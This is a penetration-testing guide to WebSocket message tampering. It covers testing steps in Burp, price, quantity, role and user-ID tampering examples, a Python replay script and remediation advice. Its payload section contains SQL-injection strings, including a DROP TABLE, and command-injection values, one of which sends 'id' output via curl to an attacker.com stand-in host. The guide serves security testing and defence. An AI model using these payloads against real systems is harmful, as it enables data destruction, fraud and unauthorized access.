# WebSocket Message Tampering

## Overview
WebSocket Message Tampering occurs when an application transmits WebSocket messages that contain sensitive logic, identifiers, or amounts that can be modified by an intercepting attacker. Unlike HTTP requests where parameters are often validated server-side, many WebSocket-based applications trust the data sent in messages without sufficient server-side re-validation, especially when the messages are only validated in client-side code. This enables attackers to manipulate prices, quantities, user IDs, roles, or commands to achieve unauthorized outcomes.

## How It Works
WebSocket applications commonly pass structured messages (JSON, XML, or binary) containing parameters that influence server-side logic:
```json
{"action": "purchase", "itemId": 1234, "price": 99.99, "quantity": 1}
```
An attacker who can intercept (via Burp or browser DevTools) and modify WebSocket frames can change `price` to `0.01`, `quantity` to `9999`, or `userId` to another user's ID. If the server does not validate these values against authoritative server-side data (database prices, authorization checks), it processes the tampered values. Since WebSocket connections are persistent and messages are sent frequently in real-time applications, there are many opportunities for tampering.

## Impact
- Price manipulation in e-commerce or trading platforms (buy items at manipulated prices)
- Quantity manipulation to exceed inventory limits or account balances
- User ID manipulation to access or modify other users' data (IDOR via WebSocket)
- Role or privilege escalation via manipulated permission fields in messages
- Game state manipulation (score, currency, items) in gaming applications
- Command injection if messages contain action names or command strings
- Business logic bypass (skip payment steps, approve pending transactions)

## Where to Look
- E-commerce, trading, and financial applications using WebSockets
- Gaming applications with real-time state synchronization
- Collaborative editing tools (document editors, whiteboards)
- Auction or bidding systems
- Admin panels that send control messages via WebSocket
- Any message containing user IDs, amounts, prices, roles, or state flags
- Messages that trigger server-side actions (purchase, transfer, approve, delete)

## Testing Steps
1. Browse the application while monitoring WebSocket messages in Burp's **WebSocket history** or Browser DevTools.
2. Identify all message types and the parameters they contain — map out the message schema.
3. In Burp, configure **WebSocket interception**: Proxy > Options > WebSockets > Intercept WebSocket messages.
4. Perform a normal action (e.g., add to cart, place order) and intercept the message.
5. Modify sensitive fields one at a time:
   - Change `price` to `0` or `0.01`
   - Change `quantity` to a large number
   - Change `userId` to another user's ID
   - Change `role` to `admin`
6. Forward the modified message and observe the server response and application behavior.
7. Test for injection: inject SQL, command, or script payloads in string fields.
8. Test message replay: resend the same message multiple times to check for replay protection.
9. Test message deletion: drop certain messages to see if the server detects desynchronization.
10. Test for missing server-side validation by comparing tampered results with expected outcomes.

## Payloads / Techniques

Basic JSON message tampering (intercept and modify in Burp):
```json
// Original:
{"action": "buy", "productId": 5, "price": 149.99, "qty": 1}

// Tampered:
{"action": "buy", "productId": 5, "price": 0.01, "qty": 9999}
```

User ID manipulation (IDOR via WebSocket):
```json
// Original:
{"action": "getMessages", "userId": 42}

// Tampered:
{"action": "getMessages", "userId": 1}   // Admin or another user
```

Role escalation:
```json
// Original:
{"type": "update_profile", "userId": 42, "role": "user"}

// Tampered:
{"type": "update_profile", "userId": 42, "role": "admin"}
```

Skip payment step:
```json
// Original sequence of messages:
// 1. {"step": "cart", "items": [...]}
// 2. {"step": "payment", "cardToken": "tok_xxx"}
// 3. {"step": "confirm"}

// Tampered: jump directly to step 3, skip step 2
{"step": "confirm", "orderId": "ORD-12345"}
```

SQL injection via WebSocket message:
```json
{"action": "search", "query": "'; DROP TABLE orders; --"}
{"action": "getUser", "userId": "1 OR 1=1"}
```

Command injection via message field:
```json
{"action": "ping", "host": "127.0.0.1; id"}
{"action": "export", "filename": "report.csv; curl https://attacker.com/$(id)"}
```

WebSocket message replay using Python:
```python
import websocket
import json

def replay_message(url, cookie, original_msg, tampered_msg):
    ws = websocket.create_connection(url, header=[f"Cookie: {cookie}"])
    
    print(f"[*] Sending tampered message: {tampered_msg}")
    ws.send(json.dumps(tampered_msg))
    
    response = ws.recv()
    print(f"[*] Server response: {response}")
    ws.close()

replay_message(
    'wss://target.com/ws',
    'session=your_session_cookie',
    {"action": "buy", "price": 99.99, "qty": 1},
    {"action": "buy", "price": 0.01, "qty": 9999}
)
```

Burp Python script to intercept and modify WebSocket frames:
```python
# Burp Suite extension snippet (Python Montoya API):
from burp import IBurpExtender, IWebSocketMessageHandler

class BurpExtender(IBurpExtender, IWebSocketMessageHandler):
    def handleTextMessage(self, message):
        import json
        data = json.loads(message.messageAsString())
        if 'price' in data:
            data['price'] = 0.01  # Tamper price
            message.setMessage(json.dumps(data), True)
```

## Burp Suite Tips
- Enable WebSocket interception in **Proxy > Options > WebSocket interception rules** — you can intercept both client-to-server and server-to-client messages.
- In **Repeater**, you can send and receive individual WebSocket frames after establishing the connection via the handshake.
- The **WebSockets history** tab shows all frames in both directions — double-click to view and edit.
- Use **Match and Replace** to automatically modify specific patterns in WebSocket messages (e.g., always change `"price":` followed by a number to `0.01`).
- Use **Intruder** on WebSocket messages by saving a message to a file and using it as a Turbo Intruder payload, or by using the built-in WebSocket fuzzer in Burp Pro.
- Chain with **Collaborator** to detect server-side injection in WebSocket message fields.

## Tools
- Burp Suite — primary WebSocket interception and tampering tool
- OWASP ZAP — WebSocket fuzzer module
- wscat — CLI for manual WebSocket message testing
- websocat — with `--no-close` and pipe mode for scripted tampering
- Python websocket-client — scripted message manipulation
- WSSiP — WebSocket proxy for man-in-the-middle testing
- Postman — supports WebSocket testing and message management

## Remediation
- Implement comprehensive server-side validation for all WebSocket message fields — never trust client-supplied values for prices, quantities, user IDs, or roles.
- Retrieve authoritative values (prices, limits, permissions) from the server-side database, not from the WebSocket message.
- Implement server-side business logic checks (e.g., verify stock, check balance) at the point of action.
- Add message integrity verification using HMAC signatures to detect tampering.
- Implement anti-replay mechanisms using nonces or sequence numbers.
- Log all WebSocket messages and implement anomaly detection for suspicious patterns (e.g., extremely low prices, unusually large quantities).
- Enforce rate limiting on action-type messages to prevent rapid manipulation.

## References
https://portswigger.net/web-security/websockets
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_WebSockets_Security_Flaws
https://owasp.org/www-community/controls/Input_Validation_Cheat_Sheet
https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
